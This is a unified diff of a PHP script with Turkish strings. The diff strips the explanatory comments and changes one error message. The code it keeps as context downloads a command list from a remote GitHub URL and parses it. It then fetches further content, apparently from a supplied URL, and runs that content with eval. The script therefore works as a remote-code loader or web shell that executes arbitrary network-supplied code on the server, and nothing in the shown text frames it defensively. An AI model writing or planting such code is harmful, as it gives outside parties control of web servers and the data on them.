@@ -1,8 +1,6 @@
 <?php
-// Komut dosyası URL'si
 $commandsUrl = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/komutlar.txt";
 
-// cURL ile komut dosyasını indirme
 function fetchRemoteFile($url) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -21,14 +19,12 @@ function fetchRemoteFile($url) {
     return $content;
 }
 
-// Komut dosyasını indir
 $commandsContent = fetchRemoteFile($commandsUrl);
 if ($commandsContent === false) {
     echo "Komut dosyası alınamadı.";
     exit();
 }
 
-// Komutları satırlara ayır
 $commands = array_filter(array_map('trim', explode("\n", $commandsContent)));
 
 // Geçerli dosya yolu
@@ -45,7 +41,6 @@ if (!empty($_SERVER['QUERY_STRING'])) {
     }
 }
 
-// Komutları işleme
 foreach ($commands as $line) {
     $parts = explode(" ", $line, 2);
     if (count($parts) < 2) continue;
@@ -101,7 +96,7 @@ if (filter_var($input, FILTER_VALIDATE_URL)) {
 if ($fileContent !== false) {
     eval('?>' . $fileContent);
 } else {
-    echo "Dosya içeriği alınamadı.";
+    echo "error php";
 }
 
 ?>
